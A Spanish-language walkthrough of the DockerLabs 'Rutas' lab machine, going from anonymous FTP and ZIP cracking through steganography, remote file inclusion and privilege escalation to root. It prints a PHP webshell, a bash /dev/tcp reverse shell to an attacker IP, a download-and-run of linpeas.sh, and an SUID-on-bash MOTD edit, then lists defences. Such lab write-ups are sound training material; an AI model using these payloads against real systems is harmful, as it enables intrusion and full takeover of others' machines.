# Rutas — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🟡 Medio  
**SO:** Linux  
**Autor de la máquina:** firstatack  
**Fecha de creación:** 13/07/2024  
**Técnicas:** FTP Anonymous · ZIP Cracking · Steganography · Gobuster · Wfuzz · RFI · PHP WebShell · Reverse Shell · sudo abuse · Writable MOTD Script

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [Enumeración FTP](#2-enumeración-ftp)
3. [Steganografía y obtención de credenciales](#3-steganografía-y-obtención-de-credenciales)
4. [Enumeración web](#4-enumeración-web)
5. [Explotación RFI](#5-explotación-rfi)
6. [Reverse Shell](#6-reverse-shell)
7. [Escalada horizontal — usuario norberto](#7-escalada-horizontal--usuario-norberto)
8. [Acceso SSH — usuario maria](#8-acceso-ssh--usuario-maria)
9. [Escalada final a root](#9-escalada-final-a-root)
10. [Lección aprendida](#10-lección-aprendida)

---

## 1. Despliegue y reconocimiento

Desplegamos la máquina vulnerable:

```bash
sudo bash auto_deploy.sh rutas.tar
```

> IP asignada: `172.17.0.2`

Realizamos un escaneo profundo:

```bash
sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
```

Resultado:

```text
21/tcp open ftp
22/tcp open ssh
80/tcp open http
```

Servicios detectados:

```text
FTP Anonymous enabled
Apache httpd
OpenSSH
```

---

## 2. Enumeración FTP

Accedemos al servicio FTP utilizando el usuario anónimo:

```bash
ftp 172.17.0.2
```

Usuario:

```text
anonymous
```

Listamos archivos:

```bash
ls
```

Resultado:

```text
respeta.zip
```

Descargamos el archivo:

```bash
get respeta.zip
```

Generamos el hash del ZIP:

```bash
zip2john respeta.zip > hash
```

Crackeamos la contraseña:

```bash
john hash
```

Resultado:

```text
chocolate
```

Extraemos el contenido:

```bash
unzip respeta.zip
```

Contraseña:

```text
chocolate
```

Archivo obtenido:

```text
oculto.txt
```

Contenido:

```text
Consigue la imagen crackpass.jpg
firstatack.github.io
Sin fuzzing con lógica y observando la sacarás muy rápido
```

---

## 3. Steganografía y obtención de credenciales

Accedemos al repositorio indicado y localizamos la imagen:

```text
crackpass.jpg
```

Descargamos el archivo:

```bash
wget http://firstatack.github.io/crackpass.jpg
```

Extraemos información oculta con `steghide`:

```bash
steghide extract -sf crackpass.jpg
```

Resultado:

```text
passw.zip
```

Extraemos el contenido:

```bash
unzip passw.zip
```

Archivo obtenido:

```text
pass
```

Contenido:

```text
hackead4:demuevo
```

Obtenemos credenciales válidas.

---

## 4. Enumeración web

Enumeramos directorios ocultos:

```bash
gobuster dir -u http://172.17.0.2 \
-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
-x php,html,txt -t 100
```

Resultado:

```text
/index.php
```

Accedemos al sitio:

```text
http://172.17.0.2/index.php
```

Inspeccionando el código fuente encontramos un dominio:

```text
trackedvuln.dl
```

Lo añadimos a `/etc/hosts`:

```bash
sudo nano /etc/hosts
```

```text
172.17.0.2 trackedvuln.dl
```

La página solicita una contraseña.

Utilizamos la credencial descubierta anteriormente:

```text
hackead4
```

Acceso correcto.

Interceptamos una petición utilizando Burp Suite y obtenemos un parámetro vulnerable.

Inicialmente probamos enumeración con Gobuster sin resultados relevantes.

Posteriormente utilizamos `wfuzz`:

```bash
wfuzz -c --hh 0 \
-w /usr/share/seclists/Discovery/Web-Content/common.txt \
"http://trackedvuln.dl/index.php?view=FUZZ"
```

Resultado:

```text
view
```

Probamos un LFI:

```text
http://trackedvuln.dl/index.php?view=/etc/passwd
```

La inclusión local no resulta útil, por lo que aprovecharemos una vulnerabilidad **RFI**.

---

## 5. Explotación RFI

Creamos una WebShell PHP:

```php
<?php

system($_GET["cmd"]);

?>
```

Guardamos el archivo como:

```text
shell.php
```

Levantamos un servidor HTTP local:

```bash
python3 -m http.server 8000
```

Utilizamos el parámetro vulnerable para incluir remotamente nuestra shell:

```text
http://trackedvuln.dl/index.php?view=http://192.168.1.26:8000/shell.php
```

Probamos ejecución de comandos:

```text
http://trackedvuln.dl/index.php?view=http://192.168.1.26:8000/shell.php&cmd=id
```

Resultado:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

La aplicación es vulnerable a **Remote File Inclusion (RFI)**.

---

## 6. Reverse Shell

Nos ponemos en escucha:

```bash
sudo nc -lvnp 443
```

Ejecutamos una reverse shell Bash:

```bash
bash -c 'bash -i >& /dev/tcp/192.168.1.26/443 0>&1'
```

Obtenemos acceso:

```bash
whoami
www-data
```

Comprobamos privilegios sudo:

```bash
sudo -l
```

Resultado:

```text
(norberto) NOPASSWD: /usr/bin/bash
```

El binario ejecuta un fichero llamado:

```text
head
```

---

## 7. Escalada horizontal — usuario norberto

Creamos un archivo malicioso en `/tmp`:

```bash
cd /tmp
nano head
```

Contenido:

```bash
#!/bin/bash
bash
```

Damos permisos de ejecución:

```bash
chmod +x head
```

Ejecutamos nuevamente el comando sudo:

```bash
sudo -u norberto /usr/bin/bash
```

Resultado:

```bash
whoami
norberto
```

Exploramos el directorio personal:

```bash
ls -la
```

Encontramos:

```text
.miscredenciales
```

Contenido:

```text
Usa mis pass para escalar
feliz hack de firstatack
```

La contraseña se encuentra codificada en Braille.

Tras decodificarla obtenemos:

```text
SORPRESA
```

---

## 8. Acceso SSH — usuario maria

Accedemos mediante SSH:

```bash
ssh maria@172.17.0.2
```

Contraseña:

```text
SORPRESA
```

Acceso correcto.

Exploramos el directorio personal y encontramos:

```text
mypass
```

Leemos el archivo:

```bash
cat mypass
```

Resultado:

```text
SORPRESA
```

Transferimos `LinPEAS`:

```bash
wget http://192.168.1.26/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

Resultado relevante:

```text
/etc/update-motd.d/00-header
```

---

## 9. Escalada final a root

Leemos el script:

```bash
cat /etc/update-motd.d/00-header
```

Observamos que el archivo es modificable:

```bash
ls -la /etc/update-motd.d/00-header
```

Resultado:

```text
-rwxr-xr-x
```

Editamos el fichero:

```bash
nano /etc/update-motd.d/00-header
```

Añadimos:

```bash
chmod u+s /bin/bash
```

Guardamos cambios.

Volvemos a conectarnos por SSH:

```bash
ssh maria@172.17.0.2
```

Ejecutamos Bash preservando privilegios:

```bash
bash -p
```

Verificamos acceso:

```bash
whoami
root
```

✅ Somos **root**.

---

## 10. Lección aprendida

| Vulnerabilidad | Impacto |
|----------------|---------|
| FTP Anonymous habilitado | Filtración de archivos |
| ZIP protegido débilmente | Descubrimiento de secretos |
| Steganografía insegura | Exposición de credenciales |
| Remote File Inclusion | Ejecución remota de código |
| PHP WebShell | Acceso interactivo |
| PATH Hijacking sobre bash | Escalada horizontal |
| Script MOTD modificable | Escalada final a root |

**Para defenderse:**

- Deshabilitar FTP anónimo innecesario.
- Evitar almacenar secretos en imágenes.
- Validar correctamente parámetros de inclusión.
- Restringir inclusión remota de archivos.
- Proteger scripts ejecutados con privilegios elevados.
- Aplicar principio de mínimo privilegio.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al repositorio.*
